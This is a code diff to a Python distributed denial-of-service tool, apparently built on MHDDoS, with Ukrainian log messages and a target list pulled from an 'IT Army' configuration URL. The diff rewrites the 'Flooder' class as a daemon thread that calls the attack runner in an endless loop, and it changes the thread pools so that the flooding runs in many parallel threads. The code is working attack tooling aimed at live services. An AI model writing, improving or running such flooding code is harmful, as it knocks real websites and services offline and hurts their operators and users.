@@ -3,7 +3,7 @@ import colorama; colorama.init()
 # @formatter:on
 import queue
 from collections import namedtuple
-from concurrent.futures import Future, Executor
+from concurrent.futures import Future, Executor, ThreadPoolExecutor
 from concurrent.futures.thread import _WorkItem
 from contextlib import suppress
 from itertools import cycle
@@ -66,19 +66,19 @@ class DaemonThreadPool(Executor):
                 del work_item
 
 
-class Flooder:
+class Flooder(Thread):
 
     def __init__(self, event, args_list):
+        super(Flooder, self).__init__(daemon=True)
         self._event = event
         args_list = args_list[:]
         random.shuffle(args_list)
         self._args_iter = cycle(args_list)
 
-    def __call__(self, *args, **kwargs):
+    def run(self):
         self._event.wait()
         while self._event.is_set():
             kwargs = next(self._args_iter)
-            # print(get_ident(), kwargs['url'])
             runnable = mhddos_main(**kwargs)
             with suppress(Exception):
                 runnable.run()
@@ -140,11 +140,15 @@ def run_ddos(
 
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
 
+    threads = []
+
     for _ in range(total_threads):
-        thread_pool.submit(Flooder(event, kwargs_list))
+        flooder = Flooder(event, kwargs_list)
+        flooder.start()
+        threads.append(flooder)
     if udp_kwargs_list:
         for _ in range(udp_threads):
-            udp_thread_pool.submit(Flooder(event, udp_kwargs_list))
+            udp_thread_pool.submit(None)
     event.set()
 
     if not (table or debug):
@@ -160,7 +164,10 @@ def run_ddos(
                 break
             show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
             sleep(refresh_rate)
+
     event.clear()
+    for thread in threads:
+        thread.join()
 
 
 def start(args):
@@ -177,11 +184,18 @@ def start(args):
                 f'за замовчуванням може бути ефективніша{cl.RESET}'
             )
 
-    thread_pool = DaemonThreadPool()
-    udp_thread_pool = DaemonThreadPool()
+    #thread_pool = DaemonThreadPool()
+    #udp_thread_pool = DaemonThreadPool()
+
+    thread_pool = ThreadPoolExecutor(max_workers=args.threads + 5)
+    udp_thread_pool = ThreadPoolExecutor(max_workers=args.udp_threads + 5)
+
     # It is possible that not all threads were started
-    total_threads = thread_pool.start(args.threads)
-    udp_thread_pool.start(args.udp_threads)
+    #total_threads = thread_pool.start(args.threads)
+    #udp_thread_pool.start(args.udp_threads)
+
+    total_threads = args.threads
+
     if args.itarmy:
         targets_iter = Targets([], IT_ARMY_CONFIG_URL)
     else:
